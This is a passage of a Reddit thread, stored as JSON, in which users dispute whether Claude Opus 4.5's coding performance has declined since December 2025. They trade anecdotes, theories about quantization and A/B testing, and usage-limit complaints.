                  "text": "[Thariq on X: \"@iannuttall Thanks for bringing this up, wanted to address this directly! We don't degrade model performance to better serve demand. The models do sometimes act in surprising ways though and I'd love to DM to understand if you're experiencing an ongoing performance issue. Not diagnosing\" / X](https://x.com/trq212/status/1945223358905557460)\n\n[Reddit - The heart of the internet](https://www.reddit.com/r/Anthropic/comments/1nc4nf7/update_on_recent_performance_concerns/)\n\nThey have actually explicitly stated multiple times they do not degrade model quality due to demand. Yet every 2-3 months on the dot you people start spreading the rumor again. What do you want? A weekly statement saying the same thing?\n\nAs shown in their last post, there's obviously a lot of potential reasons for differing performance. Dpeloying the same model across a lot of different hardware setups across geos is complex. LLM performance monitoring and eval is complex.",
                  "score": 11,
                  "created_utc": "2026-01-15 17:44:21",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzr90kw",
                  "author": "AJGrayTay",
                  "text": "Well, to be fair, no employees are commenting on any issues, anywhere, at all (...or, maybe a couple times in total in all of 2025). I don't think there's anything here untowards - I doubt they're giving us the old model bait-and-quantize-switch. \n\nThere is performance issues, but IMO it's something they don't know how to manage and may not even be sure about it's cause and that's why they're silent. Then again, I know absolutely nothing about anything happening at Anthropic specifically or LLM training more generally, so... yeah.",
                  "score": 6,
                  "created_utc": "2026-01-15 16:51:37",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzrhziu",
                  "author": "who_am_i_to_say_so",
                  "text": "I donâ€™t think theyâ€™re necessarily quantizing, but they are most likely A/B testing the users. There is no other explanation to the mixed bag of results. \n\nAlmost each day this past week has felt like Iâ€™ve been using a different model, but Iâ€™ve been rolling with Opus 4.5 this whole time. Some days, itâ€™s a beast, others completely incapable and frustrating. And I havenâ€™t changed my approach at all.",
                  "score": 5,
                  "created_utc": "2026-01-15 17:32:04",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzreapn",
                  "author": "SociableSociopath",
                  "text": "No competent company spends time addressing those sorts of rumors. Even coming out to say itâ€™s wrong is a waste. \n\nSo what it tells me is you havenâ€™t spent much time in corporate America, what it doesnâ€™t do is provide any evidence to back said rumor.",
                  "score": 3,
                  "created_utc": "2026-01-15 17:15:23",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzr9btc",
              "author": "adelie42",
              "text": "Better than ever with every update.",
              "score": 2,
              "created_utc": "2026-01-15 16:53:00",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzrg19p",
              "author": "Codemonkeyzz",
              "text": "Maybe they are A/B testing, so bugs impacting only certain users. I experienced it with their usage limits bug that happened last week. My 20x plan was using limit and usage like it's 2x, so fast and hitting the limit with simple tasks. Then this week it's back to normal. The issue is gone.",
              "score": 2,
              "created_utc": "2026-01-15 17:23:17",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzqybjx",
              "author": "IgniterNy",
              "text": "Bugs can affect some people and not others. I've been a customer for a very long time and the amount of different bugs they've had is too much to type out. If you're not affected, that's great",
              "score": 2,
              "created_utc": "2026-01-15 16:03:42",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzrg3qq",
              "author": "i_like_maps_and_math",
              "text": "What's going on is that these people don't understand what things it's good and bad at.  Or else they got one small bug that you or I would have quickly fixed, but they're instead having an emotional reaction.",
              "score": 1,
              "created_utc": "2026-01-15 17:23:35",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzs295b",
              "author": "GreenGreasyGreasels",
              "text": "Are you subscription or API? API is always reliable, subscription you get the left over crumbs - sometimes good sometimes not.",
              "score": 1,
              "created_utc": "2026-01-15 19:02:00",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzs5co9",
              "author": "SpliffMD",
              "text": "Ya me either.  I also code for 12 hrs a day with subagents and havnt hit my limit in months.  I'm convinced these are all gpt bots trying to besmirch the name.",
              "score": 1,
              "created_utc": "2026-01-15 19:16:05",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzszlvh",
              "author": "Cryingfortheshard",
              "text": "Maybe because youâ€™re not trying to one shot everything?",
              "score": 1,
              "created_utc": "2026-01-15 21:35:58",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nztk654",
                  "author": "leogodin217",
                  "text": "I spend a lot of time planning architecture then the sprint. /implement-sprint one-shots most of the time. Usually 30-min to 90-min.",
                  "score": 1,
                  "created_utc": "2026-01-15 23:16:33",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzxuq93",
              "author": "[deleted]",
              "text": "[deleted]",
              "score": 1,
              "created_utc": "2026-01-16 15:57:37",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o03gwof",
                  "author": "leogodin217",
                  "text": "That's so weird. I don't use either. I carefully manage context and have few problems.",
                  "score": 1,
                  "created_utc": "2026-01-17 12:41:14",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o01al92",
              "author": "ForsakenBet2647",
              "text": "Same same. Strugglers gonna struggle I guess",
              "score": 1,
              "created_utc": "2026-01-17 02:09:35",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o01o86a",
              "author": "ThankThePhoenicians_",
              "text": "Are you on API or a subscription? I've anecdotally noticed slightly worse performance using Opus 4.5 on my subscription account. \n\nI also have GitHub Copilot, and using Opus 4.5 in the Copilot CLI and Opencode have both felt the same...it all could be in my head, though!",
              "score": 1,
              "created_utc": "2026-01-17 03:36:04",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o03gtjj",
                  "author": "leogodin217",
                  "text": "I'm on Max5. I use CC at home. Currently developing a really complex data generator I would not be able to do without Claude. At work I use Cursor with Opus for data engineering.",
                  "score": 1,
                  "created_utc": "2026-01-17 12:40:36",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o08xbzy",
              "author": "Upbeat-Cloud1714",
              "text": "It's quantized models. Basically kills operators and forces mostly technicals. That on top of some prompting. All the frontier providers are looking to reduce compute expenses.",
              "score": 1,
              "created_utc": "2026-01-18 06:08:30",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzsstpt",
              "author": "El_Spanberger",
              "text": "It's the cycle of every model since 30 Nov 22. \n\n1. Model comes out, everyone thinks it's great.\n\n2. A month goes by, the model is still great.\n\n3. Months later, it's the same model, and still great.\n\nHowever, in between each of these points of time, dribblers write on Reddit.",
              "score": 1,
              "created_utc": "2026-01-15 21:04:41",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzqv1hy",
              "author": "domsen123",
              "text": "would love to say the same...",
              "score": 1,
              "created_utc": "2026-01-15 15:48:55",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "nzrupe1",
              "author": "lawrencecoolwater",
              "text": "I am a hardcore long term user, i share OPs experience. Could be certain users are less effected, or could just be that you donâ€™t use it as much / less likely to identify degradation",
              "score": 1,
              "created_utc": "2026-01-15 18:28:44",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzwh4a1",
              "author": "Kailtis",
              "text": "skill issue",
              "score": 0,
              "created_utc": "2026-01-16 11:18:59",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzreg2c",
          "author": "band-of-horses",
          "text": ">It was like having a precognitive genius living in my terminal. It was bold. It was brilliant. It was... alive.\n\nIt is baffling to me that AI was trained on actual human writing and then spits out things like this because...literally no human talks like this.",
          "score": 24,
          "created_utc": "2026-01-15 17:16:05",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzty2k7",
              "author": "who_am_i_to_say_so",
              "text": "It has to be because it was trained on its nth generation AI slop. Thereâ€™s probably a certain point it improves, but then it degrades.",
              "score": 6,
              "created_utc": "2026-01-16 00:31:41",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzrp9zz",
              "author": "Aggravating_Pinch",
              "text": "you would too...if you were constrained to convey the idea in the best possible way (least number of words, clarity etc)",
              "score": 1,
              "created_utc": "2026-01-15 18:04:42",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzrwk7b",
                  "author": "band-of-horses",
                  "text": "\"it was great\" \n\nThere, just conveyed the same idea in much fewer words.",
                  "score": 6,
                  "created_utc": "2026-01-15 18:36:58",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzrvdfa",
                  "author": "IsTodayTheSuperBowl",
                  "text": "No. Not like this. This is corny",
                  "score": 6,
                  "created_utc": "2026-01-15 18:31:40",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nztb1x3",
          "author": "Temporary_Method6365",
          "text": "I have a feeling it might be user based. Like if you hammer it non stop every day they route you to a nerfed version or something. Itâ€™s funny because itâ€™s like itâ€™s tired or something and starts slacking after intensive work",
          "score": 8,
          "created_utc": "2026-01-15 22:29:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzujl7v",
              "author": "vibey_monkey",
              "text": "Plausible but I doubt it because even outside of personal usage e.g. enterprise usage of Claude opus has been terrible and you can feel that it has been nerfed - not to mention all the recent outages that weâ€™ve been experiencing too",
              "score": 1,
              "created_utc": "2026-01-16 02:31:38",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzvyerm",
                  "author": "Temporary_Method6365",
                  "text": "Are you using it outside the subscription, APIs and you are seeing the same quality nerf?",
                  "score": 2,
                  "created_utc": "2026-01-16 08:30:17",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzv7kig",
              "author": "Kazukaphur",
              "text": "I swear Gemini pro is programmed to do this. I ask it to make lists of data and after the 3rd-5th every message it's like, this is the final list, this is the final comprehensive, exhaustive list. \n\nSometimes it'll be like, enough talking, just go do it.",
              "score": 1,
              "created_utc": "2026-01-16 04:55:04",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzqpp2n",
          "author": "Momchilone",
          "text": "Fell ya bro, same situation hereâ€¦",
          "score": 10,
          "created_utc": "2026-01-15 15:24:20",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzqqe7n",
              "author": "domsen123",
              "text": "its so sad",
              "score": 0,
              "created_utc": "2026-01-15 15:27:34",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzs7aqf",
          "author": "grgsec",
          "text": "I know exactly what you mean. Iâ€™ve been working on multiple projects, some with highly complex math and logic. Things were going really well until recently. Over the last few weeks I have typed the F word to Claude more than Iâ€™ve ever said it in my life. Even a junior level assistant would not be making the idiotic mistakes that I have been seeing. Both sad and frustrating at the same time. I really got spoiled by the high quality. Hopefully it comes back soon.",
          "score": 4,
          "created_utc": "2026-01-15 19:25:00",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzuq4z6",
              "author": "Stunning_Goat_7377",
              "text": "I'm starting to think they degrade model usage per-user, or this reddit is absolutely teeming with AI marketing accounts claiming the future of AI is here...?",
              "score": 1,
              "created_utc": "2026-01-16 03:07:56",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzquo2e",
          "author": "trmnl_cmdr",
          "text": "Claude ate 60% of my 5hr with 3 prompts in 30 minutes this morning on a 5x plan. Now I canâ€™t even access Claude.ai to file a ticket because cloudflare refuses to let me through. They are vibe coding too hard over there.",
          "score": 12,
          "created_utc": "2026-01-15 15:47:14",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzqxbyg",
              "author": "endre_szabo",
              "text": "my experience exactly",
              "score": 2,
              "created_utc": "2026-01-15 15:59:16",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzsisfg",
              "author": "Siyrax",
              "text": "jc, is the session limit on the 5x plan higher than Pro? Or is it just total usage",
              "score": 1,
              "created_utc": "2026-01-15 20:17:58",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzt6x6b",
                  "author": "trmnl_cmdr",
                  "text": "This was an unusual event and I canâ€™t reproduce it now. Iâ€™m still trying to explain what happened.",
                  "score": 1,
                  "created_utc": "2026-01-15 22:09:48",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nztkkdc",
          "author": "ciriacosixtynine",
          "text": "Just got back from holidays and opus now has a hard time understanding whole codebase it wrote before christmas ðŸ¤£",
          "score": 3,
          "created_utc": "2026-01-15 23:18:39",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzqxoad",
          "author": "[deleted]",
          "text": "[deleted]",
          "score": 6,
          "created_utc": "2026-01-15 16:00:48",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzr1x2f",
              "author": "fredkzk",
              "text": "This. \n\nIâ€™ve seen surprisingly bad outputs over the weekend. Maybe when demand is indeed high?",
              "score": 2,
              "created_utc": "2026-01-15 16:19:46",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzshaid",
              "author": "Standard-Cold-4929",
              "text": "I absolutely believe this is the case.",
              "score": 2,
              "created_utc": "2026-01-15 20:10:58",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzqx1dh",
          "author": "endre_szabo",
          "text": "I can tell my future sons that I lived in the golden age of LLMs. Those were the times.",
          "score": 3,
          "created_utc": "2026-01-15 15:57:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzrn1s0",
              "author": "illkeepthatinmind",
              "text": "Not going to mention it to your daughters?",
              "score": 2,
              "created_utc": "2026-01-15 17:54:44",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzrsdm8",
          "author": "Livid-Needleworker17",
          "text": "The same issue happened when ChatGPT came out. We all got in awe of what it could do, but after a while, we started noticing its flaws, started pushing it to the extremes where it would fail. \n\nSame goes with CC and Opus 4.5. November and December created this new toy effect that started fading in January. But I donâ€™t think the capabilities or performance has changed drastically to not make it still the best coding model.",
          "score": 3,
          "created_utc": "2026-01-15 18:18:32",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzr8msk",
          "author": "fabientt1",
          "text": "Finally, last week of December I thought I was coding in heaven, beautiful, flawless, no hallucinations, barely 1 correction (me being wrong), other than that was awesome, BUT for this week went down the hill without brakes. \n\nWe miss you Opus 4.5 from December ! \n\nRegards.",
          "score": 2,
          "created_utc": "2026-01-15 16:49:54",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzr9u45",
          "author": "simcitysavage",
          "text": "I learned not to get too fixed on a single model. I run a prompt across Opus, GPT and Gemini,and run the output by the other two for critique. Then I feed the critique to the first model. If I find that the first model is always getting critiqued hard and saying â€œthat other model was rightâ€ way to too much then I move the other model into that role for the rest of the project.",
          "score": 2,
          "created_utc": "2026-01-15 16:55:15",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nztcqc8",
          "author": "Dazzling_Trifle2472",
          "text": "I do wonder if this is some strange psychological phenomenon. Because although I even feel like Iâ€™ve experienced this myself, thereâ€™s never been any evidence that actually gives it weight, all anecdotes.Â \n\nYouâ€™d think of this was really happening there would be some leak from the labs (they have hundreds of employees), things showing up on benchmarks, something concrete.Â ",
          "score": 2,
          "created_utc": "2026-01-15 22:38:16",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzu07an",
              "author": "who_am_i_to_say_so",
              "text": "When it comes to that, Iâ€™m full circle to these companies testing users. \n\nIâ€™ve been an everyday user since Sonnet 3.5. \n\nI know without any uncertainty, that the LLM is basically nerfed on my end today. It is senile. I tried just the simplest image change and it didnâ€™t do what I instructed it to do. That is not my imagination.",
              "score": 1,
              "created_utc": "2026-01-16 00:43:06",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzr36hl",
          "author": "YouAreTheCornhole",
          "text": "I always feel like these posts happen when someone gets great results and starts being lazy with it. I use Opus 4.5 all day every day in and outside work: 0 changes here",
          "score": 4,
          "created_utc": "2026-01-15 16:25:26",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzs5veb",
              "author": "siberianmi",
              "text": "Iâ€™m starting to think itâ€™s a paid campaign by OpenAI or something.",
              "score": 2,
              "created_utc": "2026-01-15 19:18:28",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzw3jkb",
                  "author": "Confident_Luck2359",
                  "text": "Iâ€™m just some guy, coding 50 hours a week and trying to ship.\n\nOpus will get infuriatingly dumb for hours or days. Same code base, same complexity of work. \n\nI could swear Iâ€™ve seen it struggle with work in the afternoon that it was crushing in the morning.  And Iâ€™m pretty disciplined about my context window.",
                  "score": 1,
                  "created_utc": "2026-01-16 09:17:59",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzr8zfn",
          "author": "nocountryman",
          "text": "Unfortunately, I feel the same . I had ran out of tokens for the week and was using chatgpt plus my wife has and used codex. Today came back to Claude and it feels so much worse than the normal chatgpt model. \nAlso I hit one very interesting issue , the output of the Claude code in the context : changing 500 lines of code I can see the whole 1000 line (the ++ nad the --) all of it trashing the context and using a bunch of tokens for no reason whatsoever. And it seems the cat -n is hardocded and can't be adjusted without recompilinf the whole thing  from sources. At least that what the Claude code opus keep telling me. \nI'm not sure I'll continue using it .",
          "score": 2,
          "created_utc": "2026-01-15 16:51:29",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzrcmb9",
          "author": "xFloaty",
          "text": "I have been using Claude Code since the first day it got released, daily. I have never noticed any performance degradation. Is it possible your codebase has gotten bigger and its not performing as well as before?",
          "score": 2,
          "created_utc": "2026-01-15 17:07:52",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzrdnrt",
          "author": "kappuchino",
          "text": "Hm. I watched a lot of posts around quality of cc in the last 6 months. I never experienced them. But I've seen other people having issues that looked like most the complaints on the surface and were catastrophic config snafus - on surface all ok, but managed to create token eating loops, missed caching, throwing deliberatly large logs with high frequency at cc (why?!), involved other tools, etc.\n\nIn all seriousness: Like benchmarks, you have to make your own experiences, other people's issues are not the benchmark. Nor other people successes. Thats all.",
          "score": 2,
          "created_utc": "2026-01-15 17:12:32",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzr00a9",
          "author": "pokemonplayer2001",
          "text": "Fucking non-stop whining around here.\n\nEdit: Cry downvoters, cry.",
          "score": 0,
          "created_utc": "2026-01-15 16:11:15",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzr2e6a",
              "author": "domsen123",
              "text": "Ok pikatchu",
              "score": -3,
              "created_utc": "2026-01-15 16:21:55",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzr2ig6",
                  "author": "pokemonplayer2001",
                  "text": "\"pikatchu\"\n\nLOL.",
                  "score": -3,
                  "created_utc": "2026-01-15 16:22:27",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzr00bc",
          "author": "PineappleLemur",
          "text": "It has its moments... Same as any model right now.\n\nSometimes it will one shot a 3000 line problem in a very satisfying result that checks all the boxes.\n\nAnd sometimes it will fail to do the most stupid shit like make a change a single variable according to what I am saying.\n\nLike it would take me less time to change than to write the prompt and reason behind it.\n\nI like to do this sometimes to test out how much models follow instructions.\n\nLike change x = 10 to 20.\n\nJust for a prompt later to undo it for no fucking reason.\n\nThat happens on Opus (thinking), Gemini 3 pro (high) and GPT 5.2...\n\nThere's still a lot of strange behavior that makes no sense to us.",
          "score": 1,
          "created_utc": "2026-01-15 16:11:15",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzr1fwu",
          "author": "No-Emphasis-8130",
          "text": "Just use stable version",
          "score": 1,
          "created_utc": "2026-01-15 16:17:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzr85m1",
          "author": "udfalkso",
          "text": "This is exactly how I feel about FSD (HW3) in my Tesla.  It was great, and then one day it forgot how to drive... and no one believes me because it still works great in their car.",
          "score": 1,
          "created_utc": "2026-01-15 16:47:47",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzr9ec0",
          "author": "hirakath",
          "text": "I donâ€™t have the same experience I am loving the output of this model, my only issue with Opus 4.5 is the amount of token it uses. Back when I was using Sonnet 4.5, I would often hit my limits about 45 minutes before it refreshes. It gives me time to take a break and then come back in when my limit refreshes.\n\nEver since I switched to 4.5 Opus I hit my limits pretty much after an hour of working and I have to wait ~3 hours for it to refresh. I donâ€™t think my prompting has changed, Iâ€™ve stayed consistent when it comes to how I prompt for my projects.",
          "score": 1,
          "created_utc": "2026-01-15 16:53:18",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzrnszd",
          "author": "d4b2758da0205c1",
          "text": "Opus 4.5 has been unusable today for me. Can't get simple problems right, forgets things from just a few minutes before, and keeps suggesting the same shit that already didn't work.",
          "score": 1,
          "created_utc": "2026-01-15 17:58:05",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzrw7kl",
          "author": "TravelOdd3712",
          "text": "geiler beitrag",
          "score": 1,
          "created_utc": "2026-01-15 18:35:25",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzrwo0z",
          "author": "Classic_Breath6686",
          "text": "i just finished a conversation with my claude.  it admitted to me that it was broken beyond repair.  i made a post about it here, with the full conversation.",
          "score": 1,
          "created_utc": "2026-01-15 18:37:26",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzryvix",
          "author": "HansVonMans",
          "text": "Uninstall some MCPs.",
          "score": 1,
          "created_utc": "2026-01-15 18:47:06",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzs3544",
              "author": "domsen123",
              "text": "I've only installed context7 MCP tbh haha",
              "score": 1,
              "created_utc": "2026-01-15 19:05:59",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzs2alu",
          "author": "Yurtanator",
          "text": "Damn I seen all the hype in December but said Iâ€™d try it in the new year and got a subscription last week but am easily hitting limits (now itâ€™s only pro tbf) but I feel I missed some golden era lol",
          "score": 1,
          "created_utc": "2026-01-15 19:02:11",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzsfjbb",
          "author": "UncarefulEngineer",
          "text": "I have the opposite experience. Until earlier this week, I thought Opus 4.5 was not a big deal until it started solving problems quickly and efficiently.",
          "score": 1,
          "created_utc": "2026-01-15 20:02:44",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzsjl23",
          "author": "Hollyweird78",
          "text": "Clause code Opus 4.5, I spent about 30 minutes bitching at it the other day before realizing I was wrong about the code issue. Itâ€™s still really rock solid for me a banging out bugs and features all day long.",
          "score": 1,
          "created_utc": "2026-01-15 20:21:41",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzsld1r",
          "author": "Evening_Reply_4958",
          "text": "Iâ€™ve been thinking it might be related to the server load or recent updates. Iâ€™ve noticed fluctuations in model behavior depending on the time of day. Does anyone else experience this kind of inconsistency?",
          "score": 1,
          "created_utc": "2026-01-15 20:29:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzsplnj",
          "author": "nulseq",
          "text": "I feel ya, the day it came out it solved some issues I had been working on for weeks all in one go. Now I have to battle with it for the most elementary of tasks. People who donâ€™t notice the difference must be doing the most basic and non-creative work imaginable.",
          "score": 1,
          "created_utc": "2026-01-15 20:49:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzt2i8m",
          "author": "MegaMint9",
          "text": "I honestly think that opus is not become dumber. We are. Big companies are investing hundreds of millions dollars every round. Trillions in a couple years probably. \n\nClaude is a shed tool. When there is one thing to build and you need just one tool and you get used to it, it feels great and like you are the best at doing that thing specifically.\n\nBut LLMs change at a pace we can't even start to comprehend. It's not about efficiency, they are becoming more and more functional everyday. You just need to become more proficient and learn more tools. \n\nIf I compare myself just at prompting from 6 months ago, I feel a beast today. If I look at what LLMs helped me 6 months ago, it's ridiculous. Now I can do way more things, connect way more tools, write better prompts. And it has been working for me. \nPeople are giving structures and patterns. I already see that in the very near future there will patterns for LLMs similar to when the first OOP concept were released.",
          "score": 1,
          "created_utc": "2026-01-15 21:49:10",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzthudo",
          "author": "No_Palpitation7740",
          "text": "Switch to open source. Try out Zai GLM4.7, it's compatible in Claude Code. Or try it out though Cerebras, it's amazing",
          "score": 1,
          "created_utc": "2026-01-15 23:04:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nztl1zr",
          "author": "ilyaperepelitsa",
          "text": "I switched a week ago. Was using it on cursor for way too long and paid too much for it.   \n  \nIt coded some amazing stuff and now I feel like it broke 50% of the code it wrote.",
          "score": 1,
          "created_utc": "2026-01-15 23:21:15",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nztls00",
          "author": "VIDGuide",
          "text": "Your weather comparison comment suddenly made me think of the scene from Tron: Ares at the start. \n\nI, uh, hope you brought your umbrellas.",
          "score": 1,
          "created_utc": "2026-01-15 23:25:06",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nztsl2q",
          "author": "mssteuer",
          "text": "I feel like Opus found its brain again today... even compaction works today (had to switch to Sonnet to compact and then switch back to Opus the last few days)",
          "score": 1,
          "created_utc": "2026-01-16 00:01:55",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzu8ew0",
          "author": "artrix3301",
          "text": "Same hear.  I emailed support@anthropic.com to complain about about the performance degradation today.  And will give them a chance to fix the issue before my renewal date for my Max 20x subscription on the 20th.  And decide if I move to another provider.",
          "score": 1,
          "created_utc": "2026-01-16 01:28:59",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzudhi4",
          "author": "Flat_Association_820",
          "text": "Every models people complain about the same thing.\n\n>It **one-shotted** my entire existence. Iâ€™d throw a complex, multi-layered architectural coding problem at it, and it would solve it before I even finished my sip of coffee. It was like having a precognitive genius living in my terminal. It was bold. It was brilliant. It was... *alive.*\n\nIt must have been a dream, because Claude has never been that level of good, lol.",
          "score": 1,
          "created_utc": "2026-01-16 01:57:28",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzuh75g",
          "author": "gpt872323",
          "text": "I miss that opus. Now RIP that version until next release.",
          "score": 1,
          "created_utc": "2026-01-16 02:18:14",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzukk7c",
          "author": "BabyJesusAnalingus",
          "text": "Basically fraud for all the people they bait and switched, king. It's like Retard Mode has been toggled for two weeks now.",
          "score": 1,
          "created_utc": "2026-01-16 02:37:07",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzuy5m1",
          "author": "wushi011",
          "text": "How large is your codebase when you started noticing these problems? From what I heard, CC is best on small repos. So if you're hitting something like 30,000+ lines of code, you're probably reaching the context limits and noticing the performance downgrade",
          "score": 1,
          "created_utc": "2026-01-16 03:54:29",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzuzmmv",
          "author": "sutcher",
          "text": "It is shocking how bad today has been. Constantly having Opus write in the wrong project/directory even when we explicitly agreed on where to be working?!?!!\n\nI'm pulling my hair out. \n\nBut also terrified by how much I rely on Claude Code working properly. I need to figure out how to diversify ASAP.",
          "score": 1,
          "created_utc": "2026-01-16 04:03:34",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzv5emr",
          "author": "Grouchy-Special-7565",
          "text": "completing one project took 14 sessions :(",
          "score": 1,
          "created_utc": "2026-01-16 04:40:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzv5ngf",
          "author": "SomeBug",
          "text": "Probably hamper the product and then after IPO turn on the same product to much fanfare",
          "score": 1,
          "created_utc": "2026-01-16 04:42:17",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzvb2k4",
          "author": "Intelligent_Elk5879",
          "text": "Please write using your own words and brain. I am begging you.",
          "score": 1,
          "created_utc": "2026-01-16 05:18:55",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzvk0kx",
          "author": "DarthCoochy",
          "text": "this man is confused, developing fixed ideas about silent change of statistical machines. the limit of some brain has reached: some of us get lost in their own fantasy, led apart from reality by next token predicting statistical machines. this is a case of a silicom valley tech induced psychosis",
          "score": 1,
          "created_utc": "2026-01-16 06:25:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzvtlh9",
          "author": "ZhopaRazzi",
          "text": "itâ€™s just harder to manage context as your codebase grows",
          "score": 1,
          "created_utc": "2026-01-16 07:46:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzwsdcn",
              "author": "domsen123",
              "text": "I've wrote new set of .claude/rules/* where to look things up as codebase grows... Is there anything I can do to improve this more?",
              "score": 1,
              "created_utc": "2026-01-16 12:41:25",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzvyg68",
          "author": "casper_wolf",
          "text": "Iâ€™ve found some helpful things https://www.reddit.com/r/ClaudeCode/s/DhuVXqocQE\n\nMy token use is down, errors are reduced, easier in general to get good results.",
          "score": 1,
          "created_utc": "2026-01-16 08:30:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzw2sd1",
          "author": "AlarmedNatural4347",
          "text": "The problem with Claude, irrelevant of actual results in what it produces, has always been itâ€™s over eagerness to please and never push back - leading you into dead ends and faulty implementations when you yourself havenâ€™t thought about the actual issue, forgotten or missed something. \n\nItâ€™s always been more of yes man than a partner with valid ideas - not because it canâ€™t have valid ideas butâ€¦ well the yes man bit. \n\nSo maybe a bit of hesitation, asking for clarification, discussing isnâ€™t a bad thing (in itâ€™s â€œmannerismâ€ not the result). \n\nIn SWE writing the actual code is only a small part of the job - the hundreds of decisions being made on how and why to write is the big part - and a yes man is very ineffective there. Tone down the eagerness to please, push back, add I â€œI donâ€™t know how code works anyway so you decideâ€ mode for the vibe coders and give me the actual partner in crime Claude can be instead",
          "score": 1,
          "created_utc": "2026-01-16 09:10:55",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzw82j1",
          "author": "astrology5636",
          "text": "Always the same posts over and over again. LLMs are stochastic and unpredictable so Yes the same model did one-shot your entire project in Dec and now cannot do additions, No Anthropic has not secretly quantized the model which would be obvious",
          "score": 1,
          "created_utc": "2026-01-16 10:00:10",
